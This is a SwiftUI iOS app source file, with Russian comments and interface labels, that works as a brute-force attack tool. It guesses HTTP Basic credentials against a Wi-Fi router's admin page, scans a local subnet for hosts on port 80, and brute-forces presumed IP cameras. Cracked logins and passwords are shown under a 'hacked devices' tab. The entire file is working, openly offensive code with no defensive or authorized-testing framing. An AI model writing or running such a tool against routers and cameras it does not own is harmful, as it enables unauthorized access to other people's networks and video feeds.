import SwiftUI
import Network

// MARK: - Модели
struct Credential: Hashable { let user: String; let pass: String }
struct HitResult: Identifiable {
    let id = UUID()
    let ip: String
    let user: String
    let pass: String
    let type: String // "Wi-Fi" или "Camera"
}

// MARK: - Движок Брутфорса
final class BruteEngine: ObservableObject {
    @Published var logs = ""
    @Published var isRunning = false
    @Published var hits: [HitResult] = []
    @Published var generatedCount: Int = 0
    
    private var currentTask: Task<Void, Never>?
    
    func log(_ text: String) {
        DispatchQueue.main.async { self.logs += text + "\n" }
    }
    
    func clear() {
        logs = ""
        hits = []
        generatedCount = 0
    }
    
    func stop() {
        currentTask?.cancel()
        currentTask = nil
        DispatchQueue.main.async {
            self.isRunning = false
            self.log("[STOP] Процесс убит пользователем.")
        }
    }
    
    // MARK: Генератор паролей
    // Создает бесконечный поток случайных паролей на основе популярных паттернов
    func generateNext() -> Credential {
        let users = ["admin", "root", "user", "support"]
        let user = users.randomElement()!
        
        let mode = Int.random(in: 0...4)
        var pass = ""
        
        switch mode {
        case 0: // admin + числа
            pass = "\(user)\(Int.random(in: 1000...999999))"
        case 1: // Только числа
            pass = "\(Int.random(in: 10000...9999999))"
        case 2: // Случайный набор
            let chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$"
            pass = String((0..<8).map { _ in chars.randomElement()! })
        case 3: // Слова + числа
            let words = ["camera", "ipcam", "cctv", "wifi", "dahua", "hik", "home"]
            pass = "\(words.randomElement()!)\(Int.random(in: 1...9999))"
        default: // Спецсимволы
            pass = "\(user)@\(Int.random(in: 100...9999))!"
        }
        return Credential(user: user, pass: pass)
    }
    
    // MARK: Брутфорс Роутера (Wi-Fi панель)
    func bruteRouter(gateway: String) {
        stop()
        isRunning = true
        clear()
        log("[WI-FI] Атака на роутер: \(gateway)")
        
        currentTask = Task {
            while !Task.isCancelled {
                let cred = generateNext()
                
                if await testHTTPBasic(ip: gateway, user: cred.user, pass: cred.pass) {
                    log("[!!!] РОУТЕР ВЗЛОМАН: \(gateway) | \(cred.user):\(cred.pass)")
                    DispatchQueue.main.async { self.hits.append(HitResult(ip: gateway, user: cred.user, pass: cred.pass, type: "Wi-Fi")) }
                    DispatchQueue.main.async { self.isRunning = false }
                    return
                }
                
                DispatchQueue.main.async { self.generatedCount += 1 }
                if self.generatedCount % 10 == 0 {
                    log("[*] Роутер: проверено \(self.generatedCount). Последний: \(cred.user):\(cred.pass)")
                }
                
                try? await Task.sleep(nanoseconds: 100_000_000) // 0.1 сек между попытками
            }
        }
    }
    
    // MARK: Брутфорс Камер
    func bruteCameras(subnet: String) {
        stop()
        isRunning = true
        clear()
        log("[CAM] Поиск камер в подсети: \(subnet).0/24")
        
        currentTask = Task {
            for i in 1...254 {
                if Task.isCancelled { break }
                let ip = "\(subnet).\(i)"
                
                // Проверяем порт 80 (HTTP) - большинство камер отдают веб-интерфейс
                if await checkPort(host: ip, port: 80) {
                    log("[+] \(ip) найден. Запуск генератора...")
                    await bruteCameraIP(ip: ip)
                }
                try? await Task.sleep(nanoseconds: 50_000_000)
            }
            DispatchQueue.main.async { self.isRunning = false; self.log("[CAM] Сканирование завершено.") }
        }
    }
    
    private func bruteCameraIP(ip: String) async {
        // Бесконечный цикл, пока не найдет пароль или не остановят
        while !Task.isCancelled {
            let cred = generateNext()
            
            if await testHTTPBasic(ip: ip, user: cred.user, pass: cred.pass) {
                log("[!!!] КАМЕРА ВЗЛОМАНА: \(ip) | \(cred.user):\(cred.pass)")
                DispatchQueue.main.async { self.hits.append(HitResult(ip: ip, user: cred.user, pass: cred.pass, type: "Camera")) }
                return
            }
            
            DispatchQueue.main.async { self.generatedCount += 1 }
            if self.generatedCount % 20 == 0 {
                log("[*] Камера \(ip): попыток \(self.generatedCount). Текущий: \(cred.user):\(cred.pass)")
            }
            
            try? await Task.sleep(nanoseconds: 100_000_000) // 0.1 сек
        }
    }
    
    // MARK: Сетевые функции
    func checkPort(host: String, port: UInt16) async -> Bool {
        return await withCheckedContinuation { cont in
            let conn = NWConnection(host: .init(host), port: .init(rawValue: port)!, using: .tcp)
            var done = false
            conn.stateUpdateHandler = { state in
                if case .ready = state, !done { done = true; cont.resume(returning: true); conn.cancel() }
                else if case .failed = state, !done { done = true; cont.resume(returning: false) }
            }
            conn.start(queue: .global())
            DispatchQueue.global().asyncAfter(deadline: .now() + 0.5) {
                if !done { done = true; conn.cancel(); cont.resume(returning: false) }
            }
        }
    }
    
    func testHTTPBasic(ip: String, user: String, pass: String) async -> Bool {
        return await withCheckedContinuation { cont in
            let conn = NWConnection(host: .init(ip), port: 80, using: .tcp)
            var done = false
            let auth = "\(user):\(pass)".data(using: .utf8)!.base64EncodedString()
            let req = "GET / HTTP/1.1\r\nHost: \(ip)\r\nAuthorization: Basic \(auth)\r\nConnection: close\r\n\r\n"
            conn.stateUpdateHandler = { state in
                if case .ready = state {
                    conn.send(content: req.data(using: .utf8), completion: .contentProcessed { _ in
                        conn.receive(minimumIncompleteLength: 1, maximumLength: 1024) { data, _, _, _ in
                            defer { if !done { done = true; conn.cancel() } }
                            if let data = data, let str = String(data: data, encoding: .utf8), str.contains("200") || str.contains("HTTP/1.1 200") {
                                cont.resume(returning: true); return
                            }
                            cont.resume(returning: false)
                        }
                    })
                } else if case .failed = state, !done { done = true; cont.resume(returning: false) }
            }
            conn.start(queue: .global())
            DispatchQueue.global().asyncAfter(deadline: .now() + 1.0) {
                if !done { done = true; conn.cancel(); cont.resume(returning: false) }
            }
        }
    }
}

// MARK: - UI
struct ContentView: View {
    @StateObject var engine = BruteEngine()
    @State private var subnet = "192.168.1"
    @State private var gateway = "192.168.1.1"
    @State private var selectedTab = 0
    
    var body: some View {
        TabView(selection: $selectedTab) {
            RouterView(engine: engine, gateway: $gateway)
                .tabItem { Label("Wi-Fi Brute", systemImage: "wifi") }
                .tag(0)
            
            CamerasView(engine: engine, subnet: $subnet)
                .tabItem { Label("Cameras", systemImage: "video.fill") }
                .tag(1)
            
            HitsView(engine: engine)
                .tabItem { Label("Взломано (\(engine.hits.count))", systemImage: "lock.open.fill") }
                .tag(2)
        }
        .preferredColorScheme(.dark)
    }
}

// MARK: - Вкладка Wi-Fi
struct RouterView: View {
    @ObservedObject var engine: BruteEngine
    @Binding var gateway: String
    
    var body: some View {
        NavigationView {
            VStack {
                HStack {
                    Image(systemName: "wifi.router.fill").foregroundColor(.blue)
                    TextField("IP роутера", text: $gateway)
                        .keyboardType(.numbersAndPunctuation)
                        .textFieldStyle(.roundedBorder)
                }.padding()
                
                Button(action: { engine.bruteRouter(gateway: gateway) }) {
                    Text(engine.isRunning ? "Генерация..." : "Взломать Wi-Fi роутер")
                        .font(.headline)
                        .foregroundColor(.white)
                        .padding()
                        .frame(maxWidth: .infinity)
                        .background(engine.isRunning ? Color.gray : Color.blue)
                        .cornerRadius(10)
                }.disabled(engine.isRunning).padding(.horizontal)
                
                if engine.isRunning {
                    Button("ОСТАНОВИТЬ") { engine.stop() }.foregroundColor(.red).padding()
                }
                
                LogView(engine: engine)
            }
            .navigationTitle("Wi-Fi Brute")
        }
    }
}

// MARK: - Вкладка Камер
struct CamerasView: View {
    @ObservedObject var engine: BruteEngine
    @Binding var subnet: String
    
    var body: some View {
        NavigationView {
            VStack {
                HStack {
                    Image(systemName: "network").foregroundColor(.green)
                    TextField("Подсеть", text: $subnet)
                        .keyboardType(.numbersAndPunctuation)
                        .textFieldStyle(.roundedBorder)
                }.padding()
                
                Button(action: { engine.bruteCameras(subnet: subnet) }) {
                    Text(engine.isRunning ? "Генерация..." : "Сканировать и взломать камеры")
                        .font(.headline)
                        .foregroundColor(.white)
                        .padding()
                        .frame(maxWidth: .infinity)
                        .background(engine.isRunning ? Color.gray : Color.green)
                        .cornerRadius(10)
                }.disabled(engine.isRunning).padding(.horizontal)
                
                if engine.isRunning {
                    Button("ОСТАНОВИТЬ") { engine.stop() }.foregroundColor(.red).padding()
                }
                
                LogView(engine: engine)
            }
            .navigationTitle("Camera Brute")
        }
    }
}

// MARK: - Вкладка Результатов
struct HitsView: View {
    @ObservedObject var engine: BruteEngine
    
    var body: some View {
        NavigationView {
            List(engine.hits) { hit in
                VStack(alignment: .leading) {
                    Text("\(hit.ip) [\(hit.type)]")
                        .font(.headline)
                    Text("Логин: \(hit.user)")
                    Text("Пароль: \(hit.pass)")
                        .font(.body.monospaced())
                        .foregroundColor(.green)
                }
            }
            .navigationTitle("Взломанные устройства")
            .overlay(Group {
                if engine.hits.isEmpty {
                    Text("Пока ничего не взломано")
                        .foregroundColor(.gray)
                }
            })
        }
    }
}

// MARK: - Лог
struct LogView: View {
    @ObservedObject var engine: BruteEngine
    var body: some View {
        ScrollView {
            Text(engine.logs)
                .font(.system(.caption, design: .monospaced))
                .foregroundColor(.gray)
                .frame(maxWidth: .infinity, alignment: .leading)
                .padding()
        }
        .background(Color.black)
        .cornerRadius(10)
        .padding()
    }
}
